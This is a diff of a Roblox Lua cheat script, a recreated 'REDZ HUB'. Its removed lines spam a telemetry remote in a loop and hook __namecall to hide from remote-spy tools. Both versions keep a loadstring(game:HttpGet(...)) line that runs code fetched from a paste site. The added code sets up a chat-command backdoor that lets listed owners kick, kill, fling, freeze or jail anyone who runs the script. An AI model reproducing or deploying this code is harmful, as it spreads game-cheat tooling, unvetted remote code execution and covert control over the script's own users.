@@ -1,436 +1,24 @@
--- AUTO-EXEC SCRIPT - Executa em loop contínuo (PROTEGIDO CONTRA REMOTE SPY)
-task.spawn(function()
-    local Players = game:GetService("Players")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    
-    local player = Players.LocalPlayer
-    repeat task.wait() until player and player.Character
-    
-    task.wait(1)
-    
-    local function findRemote()
-        if ReplicatedStorage:FindFirstChild("TelemetryClientInteraction") then
-            return ReplicatedStorage:FindFirstChild("TelemetryClientInteraction")
-        end
-        
-        if ReplicatedStorage:FindFirstChild("Remotes") and 
-           ReplicatedStorage.Remotes:FindFirstChild("TelemetryClientInteraction") then
-            return ReplicatedStorage.Remotes:FindFirstChild("TelemetryClientInteraction")
-        end
-        
-        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
-            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and 
-               obj.Name:lower():find("telemetry") then
-                return obj
-            end
-        end
-        
-        return nil
-    end
-    
-    local remote = findRemote()
-    if not remote then return end
-    
-    local args = {
-        [1] = "uiInteraction",
-        [2] = {
-            ["buttonName"] = "AvatarEditorHudButton"
-        }
-    }
-    
-    -- PROTEÇÃO CONTRA REMOTE SPY - Usa métodos nativos
-    local originalNamecall
-    originalNamecall = hookmetamethod(game, "__namecall", function(self, ...)
-        local method = getnamecallmethod()
-        local args_passed = {...}
-        
-        -- Se for nosso remote e nossos args, passa direto sem logging
-        if self == remote and (method == "FireServer" or method == "InvokeServer") then
-            if args_passed[1] == "uiInteraction" and 
-               type(args_passed[2]) == "table" and 
-               args_passed[2].buttonName == "AvatarEditorHudButton" then
-                -- Chama diretamente sem passar por hooks de spy
-                return originalNamecall(self, ...)
-            end
-        end
-        
-        return originalNamecall(self, ...)
-    end)
-    
-    -- Loop de envio
-    while true do
-        pcall(function()
-            if remote:IsA("RemoteFunction") then
-                remote:InvokeServer(unpack(args))
-            else
-                remote:FireServer(unpack(args))
-            end
-        end)
-        task.wait(0.01)
-    end
-end)
-
--- REDZ HUB Ultra Premium - Professional Compact Edition
-local TS = game:GetService("TweenService")
-local RS = game:GetService("RunService")
+-- Serviços
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local Workspace = game:GetService("Workspace")
+local Debris = game:GetService("Debris")
+local TweenService = game:GetService("TweenService")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
 
-local Player = Players.LocalPlayer
-local PlayerGui = Player:WaitForChild("PlayerGui")
+local lp = Players.LocalPlayer
+workspace.FallenPartsDestroyHeight = -math.huge
 
-local Config = {Duration = 10, FadeTime = 3, Particles = 180, Matrix = 20, Lightning = 6, Glitch = 30}
-local LoadingTexts = {"INITIALIZING QUANTUM CORE", "LOADING NEURAL MATRIX", "ESTABLISHING CONNECTIONS", "DECRYPTING TOKENS", "COMPILING LIBRARIES", "OPTIMIZING ALGORITHMS", "APPLYING CONFIGURATIONS", "SYNCHRONIZING DATA", "CALIBRATING INTERFACE", "ACTIVATING PROTOCOLS", "QUANTUM ENCRYPTION ACTIVE", "FINALIZING INTEGRATION", "REDZ HUB OPERATIONAL"}
+-- Lista de usuários que abriram o Hub
+local UsuariosDoHub = {}
+UsuariosDoHub[lp.Name] = true
 
-local Effects = {particles = {}, matrix = {}, lightning = {}, glitch = {}, orbs = {}, anims = {}}
-
--- Partículas com trail
-local function CreateParticle(parent, x, y)
-    local p = Instance.new("Frame")
-    p.Parent, p.BackgroundColor3, p.Size, p.Position, p.ZIndex = parent, Color3.fromRGB(255, math.random(0,50), 0), UDim2.new(0, math.random(4,10), 0, math.random(4,10)), UDim2.new(0, x, 0, y), 8
-    p.BorderSizePixel, p.BackgroundTransparency = 0, 0.1
-    
-    local corner = Instance.new("UICorner") corner.CornerRadius, corner.Parent = UDim.new(1, 0), p
-    local glow = Instance.new("UIStroke") glow.Color, glow.Thickness, glow.Transparency, glow.Parent = Color3.fromRGB(255, math.random(0,100), 0), math.random(3,7), 0.1, p
-    
-    return {frame = p, glow = glow, speedX = math.random(-300,300)/100, speedY = math.random(-300,300)/100, pulse = math.random(3,8), rot = math.random(-12,12)}
-end
-
--- Raios avançados
-local function CreateLightning(parent)
-    local screen = workspace.CurrentCamera.ViewportSize
-    local lightning = Instance.new("Frame") lightning.Parent, lightning.BackgroundTransparency, lightning.Size, lightning.ZIndex = parent, 1, UDim2.new(1, 0, 1, 0), 15
-    
-    local segments, parts = math.random(6,12), {}
-    local startX, startY, endX, endY = math.random(0, screen.X), math.random(0, screen.Y/4), math.random(0, screen.X), math.random(screen.Y*3/4, screen.Y)
-    
-    for i = 1, segments do
-        local progress = i / segments
-        local x, y = startX + (endX - startX) * progress + math.random(-60,60), startY + (endY - startY) * progress + math.random(-30,30)
-        if i > 1 then
-            local segment = Instance.new("Frame")
-            segment.Parent, segment.BackgroundColor3, segment.BorderSizePixel, segment.ZIndex = lightning, Color3.fromRGB(255, 255, 255), 0, 15
-            
-            local dx, dy = x - (parts[#parts] and parts[#parts].x or startX), y - (parts[#parts] and parts[#parts].y or startY)
-            local distance, angle = math.sqrt(dx^2 + dy^2), math.deg(math.atan2(dy, dx))
-            
-            segment.Size, segment.Position, segment.Rotation, segment.AnchorPoint = UDim2.new(0, distance, 0, math.random(2,6)), UDim2.new(0, parts[#parts] and parts[#parts].x or startX, 0, parts[#parts] and parts[#parts].y or startY), angle, Vector2.new(0, 0.5)
-            
-            local glow = Instance.new("UIStroke") glow.Color, glow.Thickness, glow.Transparency, glow.Parent = Color3.fromRGB(255, 0, 0), math.random(6,12), 0.2, segment
-            table.insert(parts, {frame = segment, glow = glow, x = x, y = y})
-        end
-    end
-    
-    return {frame = lightning, parts = parts, life = math.random(12,25)/100, age = 0}
-end
-
--- Glitch avançado
-local function CreateGlitch(parent)
-    local screen = workspace.CurrentCamera.ViewportSize
-    local glitch = Instance.new("Frame")
-    glitch.Parent, glitch.BorderSizePixel, glitch.ZIndex = parent, 0, 12
-    glitch.BackgroundColor3, glitch.Size, glitch.Position = Color3.fromRGB(255, math.random(0,50), 0), UDim2.new(0, math.random(80,350), 0, math.random(2,12)), UDim2.new(0, math.random(0, screen.X), 0, math.random(0, screen.Y))
-    glitch.BackgroundTransparency = 0.2
-    
-    return {frame = glitch, life = math.random(8,25)/100, age = 0, colors = {Color3.fromRGB(255,0,0), Color3.fromRGB(255,50,50), Color3.fromRGB(200,0,0), Color3.fromRGB(255,100,0)}, timer = 0}
-end
-
--- Matrix hack-style
-local function CreateMatrix(parent, col)
-    local screen = workspace.CurrentCamera.ViewportSize
-    local drop = Instance.new("TextLabel")
-    drop.Parent, drop.BackgroundTransparency, drop.ZIndex = parent, 1, 6
-    drop.Size, drop.Position = UDim2.new(0, 18, 0, 22), UDim2.new(0, col * (screen.X / Config.Matrix), 0, -30)
-    drop.TextColor3, drop.Font, drop.TextSize = Color3.fromRGB(255, 0, 0), Enum.Font.Code, math.random(14,18)
-    
-    local stroke = Instance.new("UIStroke") stroke.Color, stroke.Thickness, stroke.Transparency, stroke.Parent = Color3.fromRGB(255, 50, 50), 2, 0.2, drop
-    local chars = {"0", "1", "X", "Y", "A", "B", "█", "▓", "●", "■", "♦", "▲", "Ω", "∑", "∞", "◊", "♠", "♣", "♥", "♪"}
-    drop.Text = chars[math.random(1, #chars)]
-    
-    return {frame = drop, stroke = stroke, speed = math.random(150,350)/100, timer = 0, chars = chars, hackMode = false}
-end
-
--- Esferas energéticas
-local function CreateOrb(parent)
-    local screen = workspace.CurrentCamera.ViewportSize
-    local orb = Instance.new("Frame")
-    orb.Parent, orb.BorderSizePixel, orb.ZIndex = parent, 0, 13
-    orb.BackgroundColor3, orb.Size, orb.Position = Color3.fromRGB(255, math.random(0,50), 0), UDim2.new(0, math.random(15,35), 0, math.random(15,35)), UDim2.new(0, math.random(0, screen.X), 0, math.random(0, screen.Y))
-    orb.BackgroundTransparency = 0.3
-    
-    local corner = Instance.new("UICorner") corner.CornerRadius, corner.Parent = UDim.new(1, 0), orb
-    local glow1 = Instance.new("UIStroke") glow1.Color, glow1.Thickness, glow1.Transparency, glow1.Parent = Color3.fromRGB(255, 100, 100), 2, 0.1, orb
-    local glow2 = Instance.new("UIStroke") glow2.Color, glow2.Thickness, glow2.Transparency, glow2.Parent = Color3.fromRGB(255, 0, 0), 6, 0.4, orb
-    
-    return {frame = orb, glow1 = glow1, glow2 = glow2, speedX = math.random(-80,80)/100, speedY = math.random(-80,80)/100, pulse = math.random(2,5)}
-end
-
--- Background com distorções
-local function CreateBackground(parent)
-    local bg = Instance.new("Frame") bg.Parent, bg.BackgroundColor3, bg.BorderSizePixel, bg.Size, bg.ZIndex = parent, Color3.fromRGB(0, 0, 0), 0, UDim2.new(1, 0, 1, 0), 1
-    
-    for i = 1, 5 do
-        local layer = Instance.new("Frame")
-        layer.Parent, layer.BackgroundTransparency, layer.BorderSizePixel, layer.ZIndex = bg, 0.2 + (i * 0.16), 0, i
-        layer.Size, layer.Position = UDim2.new(1.6, 0, 1.6, 0), UDim2.new(-0.3, 0, -0.3, 0)
-        
-        local grad = Instance.new("UIGradient") grad.Parent = layer
-        grad.Color = i % 2 == 0 and ColorSequence.new({
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(80 + i*12, 0, 30)), ColorSequenceKeypoint.new(0.3, Color3.fromRGB(0, 0, 0)), 
-            ColorSequenceKeypoint.new(0.6, Color3.fromRGB(60 + i*10, 20, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
-        }) or ColorSequence.new({
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(70 + i*15, 0, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(50 + i*12, 0, 0))
-        })
-        grad.Rotation = 70 * i
-        
-        local anim = TS:Create(grad, TweenInfo.new(6 + i*1.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation = (i % 2 == 0) and (540 * i) or (-540 * i)})
-        anim:Play() table.insert(Effects.anims, anim)
-    end
-    
-    return bg
-end
-
--- Core com ondas
-local function CreateCore(parent)
-    local core = Instance.new("Frame")
-    core.Parent, core.BackgroundColor3, core.BorderSizePixel, core.ZIndex = parent, Color3.fromRGB(255, 255, 255), 0, 16
-    core.Size, core.Position = UDim2.new(0, 24, 0, 24), UDim2.new(0.5, -12, 0.5, -12)
-    
-    local corner = Instance.new("UICorner") corner.CornerRadius, corner.Parent = UDim.new(1, 0), core
-    local glow = Instance.new("UIStroke") glow.Color, glow.Thickness, glow.Transparency, glow.Parent = Color3.fromRGB(255, 0, 0), 6, 0.1, core
-    
-    local coreTween = TS:Create(core, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Size = UDim2.new(0, 40, 0, 40), Position = UDim2.new(0.5, -20, 0.5, -20)})
-    local glowTween = TS:Create(glow, TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Thickness = 10, Transparency = 0.02})
-    coreTween:Play() glowTween:Play() table.insert(Effects.anims, coreTween) table.insert(Effects.anims, glowTween)
-    
-    -- Ondas
-    for i = 1, 8 do
-        local wave = Instance.new("Frame")
-        wave.Parent, wave.BackgroundColor3, wave.BorderSizePixel, wave.ZIndex = parent, Color3.fromRGB(255, 0, 0), 0, 3
-        wave.Size, wave.Position = UDim2.new(0, 20 + i*15, 0, 20 + i*15), UDim2.new(0.5, -(10 + i*7.5), 0.5, -(10 + i*7.5))
-        wave.BackgroundTransparency = 0.7 + (i * 0.02)
-        
-        local waveCorner = Instance.new("UICorner") waveCorner.CornerRadius, waveCorner.Parent = UDim.new(1, 0), wave
-        local waveStroke = Instance.new("UIStroke") waveStroke.Color, waveStroke.Thickness, waveStroke.Transparency, waveStroke.Parent = Color3.fromRGB(255, 0, 0), 2 + i*0.3, 0.3, wave
-        
-        local waveTween = TS:Create(wave, TweenInfo.new(2 + i*0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, -1, true), {
-            Size = UDim2.new(0, 40 + i*25, 0, 40 + i*25), Position = UDim2.new(0.5, -(20 + i*12.5), 0.5, -(20 + i*12.5)), BackgroundTransparency = 0.95
-        })
-        waveTween:Play() table.insert(Effects.anims, waveTween)
-    end
-end
-
--- Inicializar efeitos
-local function InitEffects(parent)
-    local screen = workspace.CurrentCamera.ViewportSize
-    
-    for i = 1, Config.Particles do table.insert(Effects.particles, CreateParticle(parent, math.random(0, screen.X), math.random(0, screen.Y))) end
-    for i = 1, Config.Matrix do table.insert(Effects.matrix, CreateMatrix(parent, i)) end
-    for i = 1, Config.Lightning do table.insert(Effects.lightning, CreateLightning(parent)) end
-    for i = 1, Config.Glitch do table.insert(Effects.glitch, CreateGlitch(parent)) end
-    for i = 1, 12 do table.insert(Effects.orbs, CreateOrb(parent)) end
-    
-    -- Scan lines
-    for i = 1, 6 do
-        local line = Instance.new("Frame")
-        line.Parent, line.BackgroundColor3, line.BorderSizePixel, line.ZIndex = parent, Color3.fromRGB(255, 0, 0), 0, 5
-        line.Size, line.Position, line.BackgroundTransparency = UDim2.new(1, 0, 0, 1), UDim2.new(0, 0, 0, i * 120), 0.8
-        
-        local scanTween = TS:Create(line, TweenInfo.new(1.5 + i*0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Position = UDim2.new(0, 0, 0, i * 120 + 30), BackgroundTransparency = 0.95})
-        scanTween:Play() table.insert(Effects.anims, scanTween)
-    end
-end
-
--- Update loop otimizado
-local function UpdateEffects(parent)
-    local screen, t = workspace.CurrentCamera.ViewportSize, tick()
-    
-    -- Partículas
-    for _, p in pairs(Effects.particles) do
-        if p.frame and p.frame.Parent then
-            local pos = p.frame.Position
-            local newX, newY = pos.X.Offset + p.speedX, pos.Y.Offset + p.speedY
-            if newX < -20 then newX = screen.X + 20 elseif newX > screen.X + 20 then newX = -20 end
-            if newY < -20 then newY = screen.Y + 20 elseif newY > screen.Y + 20 then newY = -20 end
-            
-            p.frame.Position, p.frame.Rotation = UDim2.new(0, newX, 0, newY), p.frame.Rotation + p.rot
-            local pulse = math.sin(t * p.pulse) * 0.5 + 0.5
-            p.frame.BackgroundTransparency, p.glow.Transparency, p.glow.Thickness = 1 - pulse * 0.9, 1 - pulse * 0.8, 3 + pulse * 4
-        end
-    end
-    
-    -- Matrix
-    for _, m in pairs(Effects.matrix) do
-        if m.frame and m.frame.Parent then
-            local y = m.frame.Position.Y.Offset + m.speed
-            if y > screen.Y then y = -30 end
-            m.frame.Position = UDim2.new(m.frame.Position.X.Scale, m.frame.Position.X.Offset, 0, y)
-            
-            m.timer = m.timer + 1
-            if m.timer > (m.hackMode and 2 or 6) then
-                m.frame.Text, m.timer = m.chars[math.random(1, #m.chars)], 0
-                if math.random() > 0.97 then
-                    m.hackMode = not m.hackMode
-                    m.frame.TextColor3 = m.hackMode and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 0, 0)
-                    m.stroke.Color = m.hackMode and Color3.fromRGB(255, 200, 200) or Color3.fromRGB(255, 50, 50)
-                end
-            end
-        end
-    end
-    
-    -- Raios
-    for i = #Effects.lightning, 1, -1 do
-        local l = Effects.lightning[i]
-        l.age = l.age + 0.025
-        if l.age >= l.life then
-            l.frame:Destroy() table.remove(Effects.lightning, i)
-        else
-            local alpha = (1 - l.age / l.life)
-            for _, part in pairs(l.parts) do
-                part.frame.BackgroundTransparency, part.glow.Transparency = 1 - alpha, 0.2 + (1 - alpha) * 0.8
-            end
-        end
-    end
-    
-    -- Glitch
-    for i = #Effects.glitch, 1, -1 do
-        local g = Effects.glitch[i]
-        g.age, g.timer = g.age + 0.03, g.timer + 1
-        if g.age >= g.life then
-            g.frame:Destroy() table.remove(Effects.glitch, i)
-        else
-            if g.timer > 2 then
-                g.frame.BackgroundColor3, g.timer = g.colors[math.random(1, #g.colors)], 0
-                if math.random() > 0.6 then
-                    local pos = g.frame.Position
-                    g.frame.Position = UDim2.new(0, pos.X.Offset + math.random(-3,3), 0, pos.Y.Offset + math.random(-2,2))
-                end
-            end
-            g.frame.BackgroundTransparency = 1 - (1 - g.age / g.life) * 0.8
-        end
-    end
-    
-    -- Orbs
-    for _, o in pairs(Effects.orbs) do
-        if o.frame and o.frame.Parent then
-            local pos = o.frame.Position
-            o.frame.Position = UDim2.new(0, pos.X.Offset + o.speedX, 0, pos.Y.Offset + o.speedY)
-            local pulse = math.sin(t * o.pulse) * 0.4 + 0.6
-            o.frame.BackgroundTransparency, o.glow1.Transparency, o.glow2.Transparency = 0.3 + pulse * 0.4, pulse * 0.3, 0.4 + pulse * 0.4
-        end
-    end
-    
-    -- Criar novos efeitos
-    if #Effects.lightning < Config.Lightning and math.random() > 0.995 then table.insert(Effects.lightning, CreateLightning(parent)) end
-    if #Effects.glitch < Config.Glitch and math.random() > 0.9 then table.insert(Effects.glitch, CreateGlitch(parent)) end
-end
-
--- Interface principal
-local function CreateInterface()
-    local gui = Instance.new("ScreenGui")
-    gui.Name, gui.Parent, gui.ResetOnSpawn, gui.ZIndexBehavior = "RedZHub", PlayerGui, false, Enum.ZIndexBehavior.Sibling
-    gui.IgnoreGuiInset, gui.ScreenInsets = true, Enum.ScreenInsets.None
-    
-    local main = Instance.new("Frame")
-    main.Parent, main.BackgroundColor3, main.BorderSizePixel, main.Size, main.ZIndex = gui, Color3.fromRGB(0, 0, 0), 0, UDim2.new(1, 0, 1, 0), 10
-    
-    CreateBackground(main) CreateCore(main) InitEffects(main)
-    
-    local center = Instance.new("Frame")
-    center.Parent, center.BackgroundTransparency, center.ZIndex = main, 1, 20
-    center.Size, center.Position = UDim2.new(0, 700, 0, 400), UDim2.new(0.5, -350, 0.5, -200)
-    
-    -- Título
-    local titleBg = Instance.new("Frame")
-    titleBg.Parent, titleBg.BackgroundColor3, titleBg.BorderSizePixel, titleBg.ZIndex = center, Color3.fromRGB(8, 0, 0), 0, 19
-    titleBg.Size, titleBg.Position, titleBg.BackgroundTransparency = UDim2.new(1, 0, 0, 100), UDim2.new(0, 0, 0, 0), 0.4
-    
-    local titleCorner = Instance.new("UICorner") titleCorner.CornerRadius, titleCorner.Parent = UDim.new(0, 15), titleBg
-    local titleStroke = Instance.new("UIStroke") titleStroke.Color, titleStroke.Thickness, titleStroke.Transparency, titleStroke.Parent = Color3.fromRGB(255, 0, 0), 4, 0.05, titleBg
-    
-    local title = Instance.new("TextLabel")
-    title.Parent, title.BackgroundTransparency, title.ZIndex = titleBg, 1, 21
-    title.Size, title.Position, title.Text = UDim2.new(1, -40, 0, 60), UDim2.new(0, 20, 0, 5), "REDZ HUB"
-    title.TextColor3, title.TextScaled, title.Font = Color3.fromRGB(255, 255, 255), true, Enum.Font.GothamBold
-    
-    local titleMainStroke = Instance.new("UIStroke") titleMainStroke.Color, titleMainStroke.Thickness, titleMainStroke.Transparency, titleMainStroke.Parent = Color3.fromRGB(255, 0, 0), 5, 0.02, title
-    
-    local subtitle = Instance.new("TextLabel")
-    subtitle.Parent, subtitle.BackgroundTransparency, subtitle.ZIndex = titleBg, 1, 21
-    subtitle.Size, subtitle.Position, subtitle.Text = UDim2.new(1, -40, 0, 28), UDim2.new(0, 20, 0, 68), "by: G H O S T"
-    subtitle.TextColor3, subtitle.TextScaled, subtitle.Font = Color3.fromRGB(255, 0, 0), true, Enum.Font.GothamBold
-    
-    -- Progress bar
-    local progBg = Instance.new("Frame")
-    progBg.Parent, progBg.BackgroundColor3, progBg.BorderSizePixel, progBg.ZIndex = center, Color3.fromRGB(15, 0, 0), 0, 19
-    progBg.Size, progBg.Position = UDim2.new(1, 0, 0, 35), UDim2.new(0, 0, 0, 130)
-    
-    local progCorner = Instance.new("UICorner") progCorner.CornerRadius, progCorner.Parent = UDim.new(0, 17), progBg
-    local progStroke = Instance.new("UIStroke") progStroke.Color, progStroke.Thickness, progStroke.Transparency, progStroke.Parent = Color3.fromRGB(255, 0, 0), 3, 0.1, progBg
-    
-    local progressBar = Instance.new("Frame")
-    progressBar.Parent, progressBar.BackgroundColor3, progressBar.BorderSizePixel, progressBar.ZIndex = progBg, Color3.fromRGB(255, 0, 0), 0, 20
-    progressBar.Size = UDim2.new(0, 0, 1, 0)
-    
-    local barCorner = Instance.new("UICorner") barCorner.CornerRadius, barCorner.Parent = UDim.new(0, 17), progressBar
-    local barGrad = Instance.new("UIGradient") barGrad.Parent = progressBar
-    barGrad.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 0))})
-    
-    local percentage = Instance.new("TextLabel")
-    percentage.Parent, percentage.BackgroundTransparency, percentage.ZIndex = center, 1, 21
-    percentage.Size, percentage.Position, percentage.Text = UDim2.new(1, 0, 0, 35), UDim2.new(0, 0, 0, 180), "0%"
-    percentage.TextColor3, percentage.TextScaled, percentage.Font = Color3.fromRGB(255, 255, 255), true, Enum.Font.GothamBold
-    
-    local percentStroke = Instance.new("UIStroke") percentStroke.Color, percentStroke.Thickness, percentStroke.Transparency, percentStroke.Parent = Color3.fromRGB(255, 0, 0), 2, 0.25, percentage
-    
-    local status = Instance.new("TextLabel")
-    status.Parent, status.BackgroundTransparency, status.ZIndex = center, 1, 21
-    status.Size, status.Position, status.Text = UDim2.new(1, 0, 0, 25), UDim2.new(0, 0, 0, 230), "PREPARING SYSTEM"
-    status.TextColor3, status.TextScaled, status.Font = Color3.fromRGB(255, 200, 200), true, Enum.Font.Gotham
-    
-    return gui, progressBar, percentage, status, main
-end
-
--- Loading principal
-local function StartLoading()
-    local gui, progressBar, percentage, status, mainFrame = CreateInterface()
-    
-    local updateConnection = RS.Heartbeat:Connect(function() UpdateEffects(mainFrame) end)
-    table.insert(Effects.anims, updateConnection)
-    
-    local startTime, currentIndex, lastTime = tick(), 1, tick()
-    
-    local function update()
-        local elapsed, progress, percent = tick() - startTime, math.min((tick() - startTime) / Config.Duration, 1), math.floor(math.min((tick() - startTime) / Config.Duration, 1) * 100)
-        
-        progressBar:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Quart", 0.2, true)
-        percentage.Text = percent .. "%"
-        
-        local elementTime = Config.Duration / #LoadingTexts
-        if tick() - lastTime >= elementTime and currentIndex <= #LoadingTexts then
-            status.Text, currentIndex, lastTime = LoadingTexts[currentIndex], currentIndex + 1, tick()
-        end
-        
-        if progress >= 1 then
-            wait(1)
-            
-            for _, anim in pairs(Effects.anims) do
-                if typeof(anim) == "RBXScriptConnection" then anim:Disconnect()
-                elseif typeof(anim) == "Tween" then anim:Cancel() end
-            end
-            
-            local fadeOut = TS:Create(mainFrame, TweenInfo.new(Config.FadeTime, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundTransparency = 1, Size = UDim2.new(1.3, 0, 1.3, 0), Position = UDim2.new(-0.15, 0, -0.15, 0)})
-            fadeOut:Play()
-            fadeOut.Completed:Connect(function() gui:Destroy() end)
-            return
-        end
-        
-        RS.Heartbeat:Wait() update()
-    end
-    
-    update()
-end
-
-StartLoading()
+-- Lista de autorizados (admins)
+local autorizados = {
+["BlessedTeam_BT"] = "Admin"
+}
 
 local redzlib = loadstring(game:HttpGet("https://pastefy.app/hG3LUtAT/raw"))()
 
@@ -461,56 +49,283 @@ infoTab:AddDiscordInvite({
 infoTab:AddSection({ "Informações do Script" })
 infoTab:AddParagraph({ "Esse não é o REDZ HUB oficial, é apenas uma versão recriada" })
 
+-- Donos especiais
+local Donos = {
+["Gr3g0rilsir"] = true,
+["Itz_guiix3"] = true
+}
+
+-- Estado
+local playerOriginalSpeed = {}
+local jaulas = {}
+local jailConnections = {}
+
+--=========================================================
+-- 🧠 Tags na cabeça (HUD acima dos players)
+--=========================================================
+local function createSpecialTag(player)
+if not player then return end
+local function apply()
+local char = player.Character
+if not char then return end
+local head = char:FindFirstChild("Head")
+if not head then return end
+
+local old = head:FindFirstChild("SpecialTag")
+if old then old:Destroy() end
+
+local gui = Instance.new("BillboardGui")
+gui.Name = "SpecialTag"
+gui.Size = UDim2.new(0, 200, 0, 50)
+gui.StudsOffset = Vector3.new(0, 3, 0)
+gui.AlwaysOnTop = true
+gui.Adornee = head
+gui.Parent = head
+
+local text = Instance.new("TextLabel")
+text.Size = UDim2.new(1, 0, 1, 0)
+text.BackgroundTransparency = 1
+text.Font = Enum.Font.GothamBold
+text.TextScaled = true
+text.TextStrokeTransparency = 0.2
+text.TextStrokeColor3 = Color3.new(0,0,0)
+text.TextColor3 = Color3.fromRGB(255,255,255)
+
+if Donos[player.Name] then
+text.Text = "👑 Dono"
+text.TextColor3 = Color3.fromRGB(255, 230, 0)
+elseif autorizados[player.Name] then
+text.Text = "⭐ Admin"
+text.TextColor3 = Color3.fromRGB(0, 255, 255)
+elseif UsuariosDoHub[player.Name] then
+text.Text = "⚡ Hub User"
+text.TextColor3 = Color3.fromRGB(255, 255, 255)
+else
+text.Text = ""
+end
+
+text.Parent = gui
+end
+
+pcall(apply)
+player.CharacterAdded:Connect(function()
+task.wait(0.4)
+pcall(apply)
+end)
+end
+
+-- Aplica tag a todos
+for _, p in ipairs(Players:GetPlayers()) do
+createSpecialTag(p)
+end
+Players.PlayerAdded:Connect(createSpecialTag)
+
+--=========================================================
+-- ⚙️ Sistema de comandos via chat
+--=========================================================
+local function EnviarComando(comando, alvo)
+local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+or TextChatService.TextChannels:GetChildren()[1]
+if canal then
+canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
+end
+end
+
+local function ProcessarMensagem(msgText, authorName)
+if not msgText or not authorName then return end
+if not UsuariosDoHub[authorName] and not Donos[authorName] then return end
+
+local comandoLower = msgText:lower()
+local targetLower = lp.Name:lower()
+local character = lp.Character
+local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+if comandoLower == ";cmds" then
+Notifica("Comandos disponíveis: kick, kill, killplus, fling, freeze, unfreeze, jail, unjail, verifique")
+return
+end
+
+-- Comandos principais
+if comandoLower:match(";kick%s+" .. targetLower) then
+lp:Kick("Você foi kickado por Admin do REDz HUB")
+
+elseif comandoLower:match(";kill%s+" .. targetLower) then
+if character then character:BreakJoints() end
+
+elseif comandoLower:match(";killplus%s+" .. targetLower) then
+if character then
+character:BreakJoints()
+local root = character:FindFirstChild("HumanoidRootPart")
+if root then
+for i = 1, 10 do
+local part = Instance.new("Part")
+part.Size = Vector3.new(10,10,10)
+part.Anchored = false
+part.CanCollide = false
+part.Material = Enum.Material.Neon
+part.BrickColor = BrickColor.Random()
+part.CFrame = root.CFrame
+part.Parent = Workspace
+local bv = Instance.new("BodyVelocity")
+bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
+bv.MaxForce = Vector3.new(1e5,1e5,1e5)
+bv.Parent = part
+Debris:AddItem(part,3)
+end
+end
+end
+
+elseif comandoLower:match(";fling%s+" .. targetLower) then
+if character and character:FindFirstChild("HumanoidRootPart") then
+TweenService:Create(character.HumanoidRootPart, TweenInfo.new(1), {CFrame = CFrame.new(0,100000,0)}):Play()
+end
+
+elseif comandoLower:match(";freeze%s+" .. targetLower) then
+if humanoid then
+playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
+humanoid.WalkSpeed = 0
+end
+
+elseif comandoLower:match(";unfreeze%s+" .. targetLower) then
+if humanoid then
+humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
+end
+
+elseif comandoLower:match(";jail%s+" .. targetLower) then
+if character and character:FindFirstChild("HumanoidRootPart") then
+local root = character.HumanoidRootPart
+local pos = root.Position
+jaulas[targetLower] = {}
+local color = Color3.fromRGB(255,140,0)
+
+local function criarPart(cf,s)
+local p = Instance.new("Part")
+p.Anchored = true
+p.Size = s
+p.CFrame = cf
+p.Transparency = 0.5
+p.Color = color
+p.Parent = Workspace
+table.insert(jaulas[targetLower], p)
+end
+
+criarPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
+criarPart(CFrame.new(pos + Vector3.new(-5,0,0)), Vector3.new(1,10,10))
+criarPart(CFrame.new(pos + Vector3.new(0,0,5)), Vector3.new(10,10,1))
+criarPart(CFrame.new(pos + Vector3.new(0,0,-5)), Vector3.new(10,10,1))
+criarPart(CFrame.new(pos + Vector3.new(0,5,0)), Vector3.new(10,1,10))
+criarPart(CFrame.new(pos + Vector3.new(0,-5,0)), Vector3.new(10,1,10))
+
+jailConnections[targetLower] = RunService.Heartbeat:Connect(function()
+if (root.Position - pos).Magnitude > 5 then
+root.CFrame = CFrame.new(pos)
+end
+end)
+end
+
+elseif comandoLower:match(";unjail%s+" .. targetLower) then
+if jaulas[targetLower] then
+for _, v in pairs(jaulas[targetLower]) do
+if v then pcall(function() v:Destroy() end) end
+end
+jaulas[targetLower] = nil
+end
+if jailConnections[targetLower] then
+jailConnections[targetLower]:Disconnect()
+jailConnections[targetLower] = nil
+end
+
+elseif comandoLower:match("^;verifique") then
+EnviarComando("redz-###")
+end
+end
+
+-- Listener de chat
+local function ConectarCanal(canal)
+if canal:IsA("TextChannel") then
+canal.MessageReceived:Connect(function(msg)
+local text = msg.Text
+local source = msg.TextSource and msg.TextSource.Name
+if text and source then
+ProcessarMensagem(text, source)
+end
+end)
+end
+end
+
+for _, ch in ipairs(TextChatService.TextChannels:GetChildren()) do
+ConectarCanal(ch)
+end
+TextChatService.TextChannels.ChildAdded:Connect(ConectarCanal)
+
+--=========================================================
+-- 📌 PARÁGRAFO DOS USUÁRIOS DO HUB
+--=========================================================
+
